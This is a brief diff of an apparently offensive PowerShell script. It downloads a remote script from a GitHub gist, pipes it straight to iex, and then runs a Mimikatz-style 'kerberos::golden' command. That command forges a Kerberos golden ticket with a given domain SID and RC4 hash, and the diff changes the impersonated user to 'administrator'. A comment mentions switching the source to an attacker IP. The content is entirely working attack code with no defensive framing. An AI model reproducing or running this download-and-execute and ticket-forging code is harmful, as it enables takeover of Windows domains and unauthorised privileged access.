@@ -40,5 +40,5 @@ $out = 0
 # nishang - 2.2.0 (Jul 24, 2021)
 # Change this to "attacker-ip" for internal sources
 wget('https://gist.githubusercontent.com/pich4ya/144d32262861b573279d15e653c4e08d/raw/6f019c4e2f1f62ffc0754d01dff745d3cec62057/Invoke-SoHighSoHigh.ps1') -UseBasicParsing|iex
-Invoke-SoHighSoHigh -Command '"kerberos::golden /domain:tenablead.local /sid:S-1-5-21-3478511364-370908295-858087140 /rc4:24bf619160d7eb270f76703c0a80a130 /user:gold /id:500 /ptt
+Invoke-SoHighSoHigh -Command '"kerberos::golden /domain:tenablead.local /sid:S-1-5-21-3478511364-370908295-858087140 /rc4:24bf619160d7eb270f76703c0a80a130 /user:administrator /id:500 /ptt
 "'
